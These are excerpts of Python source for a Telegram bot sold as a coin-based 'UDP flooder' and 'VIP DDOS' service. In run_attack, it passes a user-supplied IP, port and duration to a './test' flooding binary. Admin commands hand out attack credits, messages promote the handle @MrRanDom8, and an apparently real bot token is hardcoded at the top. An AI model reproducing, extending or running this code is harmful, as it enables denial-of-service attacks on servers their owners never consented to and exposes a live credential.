...
TELEGRAM_BOT_TOKEN = '7846393234:AAHUUpGltcIqRBDcREtTnwXM5mXEl8xKOQU'  # Replace with your bot token
...
async def start(update: Update, context: CallbackContext):
    ...
    message = (
        "*❄️ WELCOME TO @MrRanDom8 ULTIMATE UDP FLOODER ❄️*\n\n"
...
async def ranbal(update: Update, context: CallbackContext):
    ...
    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Tere ko simple command bhi nahi aati? Chal, sikh le: /ranbal <add|rem> <user_id> <coins>*", parse_mode='Markdown')
        return
...
async def attack(update: Update, context: CallbackContext):
    ...
    if user["coins"] < COINS_REQUIRED_PER_ATTACK:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*💰 Bhai, tere paas toh coins nahi hai! Pehle admin ke paas ja aur coins le aa. 😂 DM:- @MrRanDom8*",
            parse_mode='Markdown'
        )
        return
...
async def run_attack(chat_id, ip, port, duration, context):
    ...
    try:
        command = f"./test {ip} {port} {duration}"
...
async def help(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🛠️ @MrRanDom8 VIP DDOS Bot Help Menu 🛠️*\n\n"
        ...
        "- *Agar koi dikkat aaye toh admin ko contact karo: @MrRanDom8*\n\n"
